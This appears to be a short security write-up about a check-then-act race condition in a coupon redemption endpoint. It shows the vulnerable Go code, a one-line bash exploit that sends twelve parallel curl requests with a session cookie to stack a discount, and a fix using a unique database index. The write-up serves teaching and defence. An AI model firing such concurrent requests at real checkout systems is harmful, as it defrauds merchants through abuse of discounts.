## The Broken Invariant

> Each user may redeem a coupon at most once.

Enforced as:

```go
if coupon.AlreadyRedeemed(userID) { return ErrUsed }
order.ApplyDiscount(coupon)
coupon.MarkRedeemed(userID)
```

No transactional lock. No unique constraint. Just hope.

## Exploit

```bash
seq 1 12 | xargs -P12 -I{} curl -s -X POST \
  -H "Cookie: $SESSION" \
  -d 'code=WELCOME50' \
  https://target/checkout/apply-coupon
```

Result: 12 stacked discounts on one cart.

## Fix

Unique index on `(user_id, coupon_id)`. The database is the source of truth.
